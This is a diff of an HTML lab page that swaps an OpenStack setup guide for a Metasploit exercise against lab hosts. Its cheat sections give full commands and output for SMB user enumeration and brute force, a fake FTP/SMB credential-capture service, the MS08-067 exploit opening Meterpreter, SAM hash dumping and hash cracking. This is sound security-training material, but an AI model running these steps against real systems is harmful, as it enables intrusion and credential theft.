@@ -185,65 +185,7 @@
         </div>
       </div>
     </div>
-  <div class="modal-dialog modal-lg">
-    <div class="modal-content">
-      <div class="modal-header">
-        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
-        <h3 class="modal-title" id="myModalLabel">OpenStack OpFlex Lab</h3>
-      </div>
-      <div class="modal-body">
-		<div class="row">
-            <div class="col-lg-4 col-md-4 col-sm-6 col-xs-12">
-                <img src="./os_files/OpenStack-logo.png" class="img-responsive">
-            </div>
-            <div class="col-lg-8 col-md-8 col-sm-6 col-xs-12">
-                <p>
-                    The purpose of this lab is to provide the student a better understanding of the Cisco ACI OpenStack
-                    integration. This new integration utilizng OpFlex technology provides for better scaling and
-                    functionality of OpenStack by leveraging the advantages of the ACI fabric to provide
-                    multi-tenant networks that scale into the millions.
-                </p>
-                <p>
-                    ACI provides advanced telemetry of networks by keeping a marriage of the underlay and the overlay
-                    applications that use it. The new OpFlex integration provides a view of the telemetry of the
-                    OpenStack compute environments into the ACI infrastructure. This provides the ability to
-                    optimize operational efficiencies that are required for the agile networks of tomorrow.
-                </p>
-            </div>
-        </div>
-        <div class="row">
-            <p>
-                This lab uses real physical equipment for both OpenStack and ACI enhancing the experience of
-                how the integration works. Focused on both APIC/ML2 and the GBP integration models, the student
-                will see the differences between both models and how these integrate into ACI. This also highlights
-                how the GBP (group based policy) model benefits the DEV-OPS operational model by simplifying
-                the network for the application developer interacting with OpenStack.
-            </p>
-        </div>
-		<div class="row" style="margin-top:20px;">
-			<div class="col-lg-4 col-md-4 col-sm-12 col-xs-12">
-				<strong>Rafael Muller</strong><br>
-                Principal Engineer<br>
-				rmuller@cisco.com<br>
-			</div>
-			<div class="col-lg-4 col-md-4 col-sm-12 col-xs-12">
-				<strong>Luis Flores</strong><br>
-                System Enginer Sales<br>
-				luflores@cisco.com<br>
-			</div>
-			<div class="col-lg-4 col-md-4 col-sm-12 col-xs-12">
-				<strong>Cesar Obediente</strong><br>
-                Principal Engineer<br>
-				cobedien@cisco.com<br>
-			</div>
-		</div>
-      </div>
-      <div class="modal-footer">
-        <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
-      </div>
-    </div>
-  </div>
-</div>
+
 
 		<!-- <div class="container"> -->
 			<!-- <div class="col-lg-12 col-md-12 col-sm-12 col-xs-12"> -->
@@ -251,412 +193,574 @@
 
 
 <div class="container">
-<h1>Configure base Operating System on Controller</h1>
-    <p>As with any Linux application installation, there are some operating system parameters that need to be modified
-    to facilitate the operation of your application.  Adjustments to the firewall and NTP are required for an
-    operational OpenStack deployment. We have grouped the requirements ahead of each component installation of
-    OpenStack.</p>
-<h2>Use of RedHat Enterprise Linux for this lab</h2>
-    <p>RedHat Enterprise Linux (RHEL) is the preferred distribution of many Enterprise
-    accounts. That being said, OpenStack can be installed on many different Linux distributions, including Canonical's
-    Ubuntu. Please refer to Cisco's documentation for instructions on how to integrate with other Cisco products
-        leveraging their respectives plugins at
-    <a href="http://www.cisco.com/go/openstack">http://www.cisco.com/go/openstack</a></p>
-<div class="clearfix"></div>
-<!--
-########################################################################################################################
-Step
-########################################################################################################################
--->
-<p>In this lab, you will have access to one UCS-C220 host to run OpenStack. This node will run the OpenStack
-    Controller, the Openstack Compute and the Openstack Network in the same UCS-C220. This will allow us to take the
-    All-In-One (AIO) approach. It is important to note that in a production environment, you
-    will have many compute nodes on which you will be running your OpenStack instances (vm's). Plus dedicated nodes
-    for different Openstack functions. </p>
+<h1>Accounts and Passwords</h1>
 
-<p>Perform OS modifications on your AIO Node by connecting to <b>pod01-compute1 </b> in PuTTY
-    Connection Manager.</p>
+<h2>Exercise 1: Capture a Password</h2>
+In this exercise, you'll explore the different methods Metasploit has at its disposal to collect passwords from users that can be tricked into accessing a service you control.
 
-<h3>Step 1 - Configure NTP for proper time synchronization</h3>
-<p>In OpenStack it is <strong>critical</strong> to have proper time synchronization across each of the component hosts.
-    In RHEL the default time protocol is called Chrony. Chrony is a variation of the NTPd engine of linux that is
-    designed for dis-association of NTP resources ( for example laptops that lose access to their network clocks ).
-    In your OpenStack environment you can run either Chrony or NTPd as needed. For the purpose of this lab we will
-    be using chrony and it has been pre-configured for you.</p>
+<hr>
+<h3>Task 1</h3>
+Verify that PostgreSQL server is running...
 
-
-
-    <div class="topbar">
-        <div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>Controller/Compute POD1</div>
-        <div class="topbarbutton"></div>
-    </div>
-
-
-<div class="commandblock">
-    <div class="copyseqnumber">
-        1
-        <button class="btn btn-xs btn-danger copybutton" data-clipboard-target="#copy-1">Copy</button>
-    </div>
+<!-- this is a copy /paste block - put the title and the code you want to copy and paste - or ask Omar -->
+<div class="topbar">
+<div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>Status of PostgreSQL</div>
+<div class="topbarbutton"></div> </div>
+<div class="commandblock"> <div class="copyseqnumber"> 1 <button class="btn btn-xs btn-danger copybutton" data-clipboard-target="#copy-1">Copy</button></div>
 <div class="ciscohl2" id="copy-1" style="background: url(&quot;/static/images/ok.png&quot;) right bottom / 45px 45px no-repeat rgb(224, 255, 203);">
-<pre># This is the copy group: 1<br>
+<!-- put the code here -->
+<pre>
+systemctl status postgresql
+</pre>
+</div></div>
+<!-- end of copy /paste block -->
 
-<code>
-systemctl status chronyd
-</code>
+<pre>
+root@bah-pod1-kali:~# systemctl status postgresql
+postgresql.service - PostgreSQL RDBMS
+   Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; vendor preset: disab
+   Active: active (exited) since Fri 2016-09-30 15:40:39 UTC; 2min 30s ago
+  Process: 3452 ExecStart=/bin/true (code=exited, status=0/SUCCESS)
+ Main PID: 3452 (code=exited, status=0/SUCCESS)
+
+Sep 30 15:40:39 bah-pod1-kali systemd[1]: Starting PostgreSQL RDBMS...
+Sep 30 15:40:39 bah-pod1-kali systemd[1]: Started PostgreSQL RDBMS.
+</pre>
+
+<hr>
+<h3>Task 2</h3>
+Open Metasploit msfconsole
+<!-- this is a copy /paste block - put the title and the code you want to copy and paste - or ask Omar -->
+<div class="topbar">
+<div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>Open msfconsole</div>
+<div class="topbarbutton"></div> </div>
+<div class="commandblock"> <div class="copyseqnumber"> 2 <button class="btn btn-xs btn-danger copybutton" data-clipboard-target="#copy-2">Copy</button></div>
+<div class="ciscohl2" id="copy-2" style="background: url(&quot;/static/images/ok.png&quot;) right bottom / 45px 45px no-repeat rgb(224, 255, 203);">
+<!-- put the code here -->
+<pre>
+msfconsole
+</pre>
+</div></div>
+<!-- end of copy /paste block -->
+
+
+<hr>
+<h3>Task 3</h3>
+Using tab completion, find out what services Metasploit can emulate from </pre>use auxiliary/server/ and use auxiliary/server/capture/ </pre>
+
+<br>
+<pre>
+msf > use auxiliary/server/[TAB]
+use auxiliary/server/android_browsable_msf_launch
+use auxiliary/server/android_mercury_parseuri
+use auxiliary/server/browser_autopwn
+...
+</pre>
+
+<hr>
+<h3>Task 4</h3>
+<ul><li>
+<p>Set up an FTP password capture session using Metasploit. Log into this session from Kali with&nbsp;<tt>ftp&nbsp;192.168.1.2</tt></p>
+<ul><li>
+<p>Observe the&nbsp;<tt>msfconsole</tt>&nbsp;window while doing this</p>
+</li>
+</ul></li></ul>
+
+<hr>
+<h3>Task 5</h3>
+<p>Kill the FTP background job. Try&nbsp;<tt>jobs&nbsp;-h</tt></p>
+
+
+<hr>
+<h3>Bonus</h3>
+<p>Try the SMB capture utility while accessing from Windows!</p>
+<ul>
+<li>
+<p>Start &rarr; Run... &rarr;&nbsp;<tt>\\kali.seccon.ninja</tt></p>
+</li>
+<li>How is SMB different in the way it handles its passwords? Did you have to log in first before credentials were shared with Metasploit?</li>
+</ul>
+
+<hr>
+<h3>Bonus</h3>
+Suggest a way these utilities could be used with IP routing/ARP poisoning attacks you learned in Module 4.
+
+<hr>
+<h2>Exercise 2: Brute-Force a Samba Password with Metasploit</h2>
+<p>Metasploitable2 has accounts with easily guessable passwords. Enumerate the accounts and guess the passwords using Metasploit. Wordlists can be found in&nbsp;<tt>/usr/share/wordlists</tt>. Make sure&nbsp;<tt>db_status</tt>&nbsp;shows the following:</p>
+
+<pre>
+msf > db_status
+[*] postgresql connected to msf3
+</pre>
+
+<hr>
+<h3>Task 1</h3>
+<p>Enumerate the users on&nbsp;<tt>metasploitable</tt>&nbsp;using the&nbsp;<tt>auxiliary/scanner/smb/smb_enumusers</tt>&nbsp;plugin</p>
+
+<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
+<br><a target="blank" data-toggle="modal" data-target="#Cheat1" href="#"> ++ Click here for Cheat</a>
+<div class="modal fade" id="Cheat1" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-lg">
+    <div class="modal-content">
+      <div class="modal-header">
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+        <h3 class="modal-title" id="myModalLabel">Cheat</h3>
+      </div>
+      <div class="modal-body">
+    <div class="row">
+<pre>
+  msf > use auxiliary/scanner/smb/smb_enumusers
+  msf auxiliary(smb_enumusers) > set RHOSTS metasploitable
+  RHOSTS => metasploitable
+  msf auxiliary(smb_enumusers) > run
+
+  [*] 192.168.1.3 METASPLOITABLE [ games, nobody, bind, proxy, syslog, user, www-data, root, news, postgres, bin, mail, distccd, proftpd, dhcp, daemon, sshd, man, lp, mysql, gnats, libuuid, backup, msfadmin, telnetd, sys, klog, postfix, service, list, irc, ftp, tomcat55, sync, uucp ] ( LockoutTries=0 PasswordMin=5 )
+  [*] Scanned 1 of 1 hosts (100% complete)
+  [*] Auxiliary module execution completed
+</pre>
+</div>
+</div>
+  <hr><br>
+
+<div class="modal-footer">
+<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+</div>
+</div>
+</div>
+</div>
+<!--end hint -->
+
+
+<hr>
+<h3>Task 2</h3>
+<p>Use the SMB Login Check Scanner to brute force into Samba. Try the username as the password for all users. Use the&nbsp;<strong>seccon.txt</strong>&nbsp;wordlist</p>
+
+<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
+<br><a target="blank" data-toggle="modal" data-target="#Hint1" href="#"> ++ Click here for Hint</a>
+<div class="modal fade" id="Hint1" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-lg">
+    <div class="modal-content">
+      <div class="modal-header">
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+        <h3 class="modal-title" id="myModalLabel">Hint</h3>
+      </div>
+      <div class="modal-body">
+    <div class="row">
+To reduce the amount of work you have to do, only attempt to brute-force the following accounts:<br>
+<pre>
+  msfadmin
+  user
+  postgres
+  sys
+  klog
+  service
 
 </pre>
 </div>
 </div>
+  <hr><br>
+
+<div class="modal-footer">
+<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+</div>
+</div>
+</div>
+</div>
+<!--end hint -->
 
 
+<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
+<br><a target="blank" data-toggle="modal" data-target="#Cheat2" href="#"> ++ Click here for Cheat</a>
+<div class="modal fade" id="Cheat2" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-lg">
+    <div class="modal-content">
+      <div class="modal-header">
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+        <h3 class="modal-title" id="myModalLabel">Cheat</h3>
+      </div>
+      <div class="modal-body">
+    <div class="row">
+<pre>
+  seccon@seccon-kali1:~/labs/08-accounts$ cat users
+  msfadmin
+  user
+  postgres
+  sys
+  klog
+  service
 
-
-    <div class="topbar">
-        <div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>Controller/Compute POD1</div>
-        <div class="topbarbutton"></div>
-    </div>
-
-<div class="commandblock">
-<div class="">
-<pre><strong>pod01-compute1#</strong> systemctl status chronyd
-chronyd.service - NTP client/server
-   Loaded: loaded (/usr/lib/systemd/system/chronyd.service; enabled)
-   Active: <b><span style="color:green">active (running)</span> </b> since Mon 2015-10-12 11:20:09 EDT; 59s ago
-  Process: 25969 ExecStartPost=/usr/libexec/chrony-helper add-dhclient-servers (code=exited, status=0/SUCCESS)
-  Process: 25966 ExecStart=/usr/sbin/chronyd -u chrony $OPTIONS (code=exited, status=0/SUCCESS)
- Main PID: 25968 (chronyd)
-   CGroup: /system.slice/chronyd.service
-           └─25968 /usr/sbin/chronyd -u chrony
-
-Oct 12 11:20:09 devpod1-openstack-controller.cisco.com systemd[1]: Starting NTP client/server...
-Oct 12 11:20:09 devpod1-openstack-controller.cisco.com chronyd[25968]: chronyd version 1.29.1 starting
-Oct 12 11:20:09 devpod1-openstack-controller.cisco.com chronyd[25968]: Linux kernel major=3 minor=10 patch=0
-Oct 12 11:20:09 devpod1-openstack-controller.cisco.com chronyd[25968]: hz=100 shift_hz=7 freq_scale=1.00000000 nominal_tick=1...l=2
-Oct 12 11:20:09 devpod1-openstack-controller.cisco.com chronyd[25968]: Frequency -78.309 +/- 0.032 ppm read from /var/lib/chr...ift
-Oct 12 11:20:09 devpod1-openstack-controller.cisco.com systemd[1]: Started NTP client/server.
-Oct 12 11:20:14 devpod1-openstack-controller.cisco.com chronyd[25968]: Selected source 172.18.106.1
-Hint: Some lines were ellipsized, use -l to show in full.
+  seccon@seccon-kali1:~/labs/08-accounts$ sudo msfconsole
+  ...
+  msf > use auxiliary/scanner/smb/smb_login
+  msf auxiliary(smb_login) > set RHOSTS metasploitable
+  RHOSTS => metasploitable
+  msf auxiliary(smb_login) > set USER_AS_PASS true
+  USER_AS_PASS => true
+  msf auxiliary(smb_login) > set PASS_FILE /usr/share/wordlists/seccon.txt
+  PASS_FILE => /usr/share/wordlists/seccon.txt
+  msf auxiliary(smb_login) > set USER_FILE users
+  USER_FILE => users
+  msf auxiliary(smb_login) > run
 </pre>
 </div>
 </div>
+  <hr><br>
 
-
-<p>To get the information on the status of what chrony tracking, use <code>chronyc tracking</code>.</p>
-
-
-
-    <div class="topbar">
-        <div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>Controller/Compute POD1</div>
-        <div class="topbarbutton"></div>
-    </div>
-
-
-<div class="commandblock">
-    <div class="copyseqnumber">
-        2
-        <button class="btn btn-xs btn-danger copybutton" data-clipboard-target="#copy-2">Copy</button>
-    </div>
-<div class="ciscohl2" id="copy-2">
-<pre># This is the copy group: 2<br>
-
-<code>
-chronyc tracking
-</code>
-
-</pre>
+<div class="modal-footer">
+<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
 </div>
 </div>
-
-
-
-    <div class="topbar">
-        <div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>Controller/Compute POD1</div>
-        <div class="topbarbutton"></div>
-    </div>
-
-<div class="commandblock">
-<div class="">
-<pre># chronyc tracking
-Reference ID    : 10.0.236.10 (ntp-vlan336.ecatsrtpdmz.cisco.com)
-Stratum         : 3
-Ref time (UTC)  : Tue Jan  6 14:42:10 2015
-System time     : 93476.671875000 seconds slow of NTP time
-Last offset     : -0.000186148 seconds
-RMS offset      : 3119.961914062 seconds
-Frequency       : 48.261 ppm fast
-Residual freq   : -0.011 ppm
-Skew            : 8.250 ppm
-Root delay      : 0.020065 seconds
-Root dispersion : 0.023922 seconds
-Update interval : 479.2 seconds
-Leap status     : Normal
-</pre>
 </div>
 </div>
+<!--end hint -->
 
-<!--
-##############################################################################################################################
-Step
-##############################################################################################################################
--->
-<h3>Step 2 - Configure HOSTS file for Name Resolution</h3>
-<p>Setting proper hostnames definition plays a key role in the setup of various components of OpenStack ( in particular
-    RabbitMQ - RabiitMQ will be discussed in the upcoming chapter). There are three things that need to match for
-    RabbitMQ to properly operate. The first part is that the hostname is correct in the file /etc/hosts. The second is
-    the environment variable HOSTNAME that is derived in the system. The third is the hostname definition in
-    /etc/hostname. </p>
+<hr>
+<h3>Task 3</h3>
+<p>View the captured credentials in the database. What is the password for&nbsp;<tt>sys</tt>&nbsp;account?</p>
+
+<hr>
+<h3>Bonus</h3>
+<p>Using the results from your active recon and information about services in the database, figure out an alternate way to log into&nbsp;<tt>metasploitable</tt>&nbsp;not involving Samba</p>
 
 
+<hr>
+<h2>Exercise 3: Crack An NTLM-hashed Password</h2>
 
-    <div class="topbar">
-        <div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>Controller/Compute POD1</div>
-        <div class="topbarbutton"></div>
-    </div>
+<hr>
+<h3>Task 1</h3>
+<p>Using the&nbsp;<strong>MS08-067</strong>&nbsp;vulnerability, exploit and setup a&nbsp;<a href="http://www.offensive-security.com/metasploit-unleashed/Meterpreter_Basics">Meterpreter</a>&nbsp;session with&nbsp;<strong>windows</strong></p>
 
+<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
+<br><a target="blank" data-toggle="modal" data-target="#Hint2" href="#"> ++ Click here for Hint</a>
+<div class="modal fade" id="Hint2" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-lg">
+    <div class="modal-content">
+      <div class="modal-header">
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+        <h3 class="modal-title" id="myModalLabel">Hint</h3>
+      </div>
+      <div class="modal-body">
+    <div class="row">
+Try using the search command:<br>
+<pre>
+  msf > search ms08_067
 
-<div class="commandblock">
-    <div class="copyseqnumber">
-        3
-        <button class="btn btn-xs btn-danger copybutton" data-clipboard-target="#copy-3">Copy</button>
-    </div>
-<div class="ciscohl2" id="copy-3" style="background-color: #e0ffcb;">
-<pre># This is the copy group: 3<br>
+  Matching Modules
+  ================
 
-<code>
-cat &lt;&lt;EOF &gt; /etc/hosts
-127.0.0.1   localhost localhost.localdomain
-10.0.236.101  pod01-compute1 pod01-compute1.ecatsrtpdmz.cisco.com
-EOF
-</code>
+     Name                                 Disclosure Date          Rank   Description
+     ----                                 ---------------          ----   -----------
+     exploit/windows/smb/ms08_067_netapi  2008-10-28 00:00:00 UTC  great  MS08-067 Microsoft Server Service Relative Path Stack Corruption
 
 </pre>
 </div>
 </div>
+  <hr><br>
+
+<div class="modal-footer">
+<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+</div>
+</div>
+</div>
+</div>
+
+<!--end hint -->
 
 
+<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
+<br><a target="blank" data-toggle="modal" data-target="#Cheat3" href="#"> ++ Click here for Cheat</a>
+<div class="modal fade" id="Cheat3" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-lg">
+    <div class="modal-content">
+      <div class="modal-header">
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+        <h3 class="modal-title" id="myModalLabel">Cheat</h3>
+      </div>
+      <div class="modal-body">
+    <div class="row">
 
+<pre>
+  msf > use exploit/windows/smb/ms08_067_netapi
+  msf exploit(ms08_067_netapi) > set RHOST windows
+  RHOST => windows
+  msf exploit(ms08_067_netapi) > run
 
-    <div class="topbar">
-        <div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>Controller/Compute POD1</div>
-        <div class="topbarbutton"></div>
-    </div>
+  [*] Started reverse handler on 192.168.1.2:4444
+  [*] Automatically detecting the target...
+  [*] Fingerprint: Windows XP - Service Pack 3 - lang:English
+  [*] Selected Target: Windows XP SP3 English (AlwaysOn NX)
+  [*] Attempting to trigger the vulnerability...
+  [*] Sending stage (769536 bytes) to 192.168.1.4
+  [*] Meterpreter session 1 opened (192.168.1.2:4444 -> 192.168.1.4:1052) at 2014-11-21 18:15:20 -0800
 
-
-<div class="commandblock">
-    <div class="copyseqnumber">
-        4
-        <button class="btn btn-xs btn-danger copybutton" data-clipboard-target="#copy-4">Copy</button>
-    </div>
-<div class="ciscohl2" id="copy-4">
-<pre># This is the copy group: 4<br>
-
-<code>
-cat &lt;&lt;EOF &gt; /etc/hostname
-pod01-compute1
-EOF
-</code>
+  meterpreter >
 
 </pre>
 </div>
 </div>
+  <hr><br>
 
+<div class="modal-footer">
+<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+</div>
+</div>
+</div>
+</div>
 
-<!--
-##############################################################################################################################
-Step
-##############################################################################################################################
--->
-<h3>Step 3 - Disable Network Manager Service and enable network</h3>
+<!--end hint -->
 
-
-
-    <div class="topbar">
-        <div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>Controller/Compute POD1</div>
-        <div class="topbarbutton"></div>
-    </div>
-
-
-<div class="commandblock">
-    <div class="copyseqnumber">
-        5
-        <button class="btn btn-xs btn-danger copybutton" data-clipboard-target="#copy-5">Copy</button>
-    </div>
-<div class="ciscohl2" id="copy-5" style="background-color: #e0ffcb;">
-<pre># This is the copy group: 5<br>
-
-<code>
-systemctl disable NetworkManager.service
-systemctl stop NetworkManager.service
-systemctl mask NetworkManager.service
+<hr>
+<h3>Task 2</h3>
+<p>Display the hashes out of&nbsp;<a href="http://en.wikipedia.org/wiki/Security_Accounts_Manager">SAM</a>. Suspend the Meterpreter session to the background</p>
+<ul>
+<li>
+<p>You can display your current background sessions with the&nbsp;<tt>session</tt>&nbsp;command</p>
+</li>
+</ul>
 
 
 
-chkconfig network on
-systemctl restart network
-</code>
+<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
+<br><a target="blank" data-toggle="modal" data-target="#Cheat4" href="#"> ++ Click here for Cheat</a>
+<div class="modal fade" id="Cheat4" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-lg">
+    <div class="modal-content">
+      <div class="modal-header">
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+        <h3 class="modal-title" id="myModalLabel">Cheat</h3>
+      </div>
+      <div class="modal-body">
+    <div class="row">
+
+<pre>
+
+meterpreter > hashdump
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+HelpAssistant:1000:4f7f3b0478068dbc155ac748a60cd08d:c99241d31fe8453e3cb865be137309b4:::
+seccon:1003:e17a6020453a1523aad3b435b51404ee:d3eb09053fbe2ba3f37e6e773f763827:::
+SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:0b5c1b2296ed366332095252c3f83100:::
+user:1004:e52cac67419a9a224a3b108f3fa6cb6d:7b592e4f8178b4c75788531b2e747687:::
+
+meterpreter > background
+
+[*] Backgrounding session 1...
+
+msf exploit(ms08_067_netapi) > sessions -l
+
+Active sessions
+===============
+
+  Id  Type                   Information                    Connection
+  --  ----                   -----------                    ----------
+  1   meterpreter x86/win32  NT AUTHORITY\SYSTEM @ WINDOWS  192.168.1.2:4444 -> 192.168.1.4:1054 (192.168.1.4)
+
+msf exploit(ms08_067_netapi) >
 
 </pre>
 </div>
 </div>
+  <hr><br>
+
+<div class="modal-footer">
+<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+</div>
+</div>
+</div>
+</div>
+
+<!--end hint -->
 
 
+<hr>
+<h3>Task 3</h3>
+<p>Dump the hashes out of SAM with the&nbsp;<tt>post/windows/gather/smart_hashdump</tt>&nbsp;utility</p>
+<ul>
+<li>
+<p>The hash file in JtR format should show up in&nbsp;<tt>loot</tt></p>
+</li>
+</ul>
 
-<!--
-##############################################################################################################################
-Step
-##############################################################################################################################
--->
-<h3>Step 4 - Install OpenStack and OpenStack Utilities</h3>
-    <p>
-        For this lab we have setup a local repository with all the appropriate packages related to RedHat enterprise
-        Linux snapshot to specific package versions. This insures that the lab has consistent results since the upstream
-        code base is the same. In your production environment you will always want to create a repository and install
-        from the same base code to insure consistency when installing different compute hosts over time. We will
-        show more details on the package details for you in another chapter including inserting the Cisco OpFLex
-        packages into the repository to be able to install them automatically.
-    </p>
+<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
+<br><a target="blank" data-toggle="modal" data-target="#Cheat5" href="#"> ++ Click here for Cheat</a>
+<div class="modal fade" id="Cheat5" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-lg">
+    <div class="modal-content">
+      <div class="modal-header">
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+        <h3 class="modal-title" id="myModalLabel">Cheat</h3>
+      </div>
+      <div class="modal-body">
+    <div class="row">
 
+<pre>
 
-    <div class="topbar">
-        <div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>Controller/Compute POD1</div>
-        <div class="topbarbutton"></div>
-    </div>
+  msf exploit(ms08_067_netapi) > use post/windows/gather/smart_hashdump
 
+  msf post(smart_hashdump) > sessions -l
 
-<div class="commandblock">
-    <div class="copyseqnumber">
-        6
-        <button class="btn btn-xs btn-danger copybutton" data-clipboard-target="#copy-6">Copy</button>
-    </div>
-<div class="ciscohl2" id="copy-6">
-<pre># This is the copy group: 6<br>
+  Active sessions
+  ===============
 
-<code>
-yum -y install openstack-selinux openstack-utils
-</code>
+    Id  Type                   Information                    Connection
+    --  ----                   -----------                    ----------
+    1   meterpreter x86/win32  NT AUTHORITY\SYSTEM @ WINDOWS  192.168.1.2:4444 -> 192.168.1.4:1054 (192.168.1.4)
+
+  msf post(smart_hashdump) > set SESSION 1
+
+  SESSION => 1
+
+  msf post(smart_hashdump) > run
+
+  [*] Running module against WINDOWS
+  [*] Hashes will be saved to the database if one is connected.
+  [*] Hashes will be saved in loot in JtR password file format to:
+  [*] /root/.msf4/loot/20141121182250_default_192.168.1.4_windows.hashes_123878.txt
+  [*] Dumping password hashes...
+  [*] Running as SYSTEM extracting hashes from registry
+  [*]     Obtaining the boot key...
+  [*]     Calculating the hboot key using SYSKEY 26a1ab029cc81f35c920f4e2409cc7e5...
+  [*]     Obtaining the user list and keys...
+  [*]     Decrypting user keys...
+  [*]     Dumping password hints...
+  [+]     seccon:"seccon!"
+  [*]     Dumping password hashes...
+  [+]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+  [+]     HelpAssistant:1000:4f7f3b0478068dbc155ac748a60cd08d:c99241d31fe8453e3cb865be137309b4:::
+  [+]     SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:0b5c1b2296ed366332095252c3f83100:::
+  [+]     seccon:1003:e17a6020453a1523aad3b435b51404ee:d3eb09053fbe2ba3f37e6e773f763827:::
+  [+]     user:1004:e52cac67419a9a224a3b108f3fa6cb6d:7b592e4f8178b4c75788531b2e747687:::
+  [*] Post module execution completed
+
+  msf post(smart_hashdump) > loot
+
+  Loot
+  ====
+
+  host         service  type            name                content     info            path
+  ----         -------  ----            ----                -------     ----            ----
+  192.168.1.4           windows.hashes  WINDOWS_hashes.txt  text/plain  Windows Hashes  /root/.msf4/loot/20141121182250_default_192.168.1.4_windows.hashes_123878.txt
 
 </pre>
 </div>
 </div>
+  <hr><br>
+
+<div class="modal-footer">
+<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+</div>
+</div>
+</div>
+</div>
+
+<!--end hint -->
 
 
-<!--
-##############################################################################################################################
-Step
-##############################################################################################################################
--->
-<h3>Step 5- Upgrade system packages</h3>
-    <p>
-        Upgrade all the packages from the original ISO PXEBOOT install disk.
-    </p>
+<hr>
+<h3>Task 4</h3>
+<p>Crack the NTLM hashes out of SAM with the&nbsp;<tt>auxiliary/analyze/jtr_crack_fast</tt>&nbsp;utility</p>
 
+<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
+<br><a target="blank" data-toggle="modal" data-target="#Cheat6" href="#"> ++ Click here for Cheat</a>
+<div class="modal fade" id="Cheat6" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-lg">
+    <div class="modal-content">
+      <div class="modal-header">
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+        <h3 class="modal-title" id="myModalLabel">Cheat</h3>
+      </div>
+      <div class="modal-body">
+    <div class="row">
 
-    <div class="topbar">
-        <div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>Controller/Compute POD1</div>
-        <div class="topbarbutton"></div>
-    </div>
+<pre>
 
+msf post(smart_hashdump) > use auxiliary/analyze/jtr_crack_fast
+msf auxiliary(jtr_crack_fast) > run
 
-<div class="commandblock">
-    <div class="copyseqnumber">
-        7
-        <button class="btn btn-xs btn-danger copybutton" data-clipboard-target="#copy-7">Copy</button>
-    </div>
-<div class="ciscohl2" id="copy-7">
-<pre># This is the copy group: 7<br>
+[*] Seeded the password database with 19 words...
+fopen: /opt/metasploit/apps/pro/msf3/data/john/run.linux.x86.sse2/password.lst: No such file or directory
+[*] Output: Loaded 7 password hashes with no different salts (LM DES [128/128 BS SSE2])
+[*] Output: Remaining 2 password hashes with no different salts
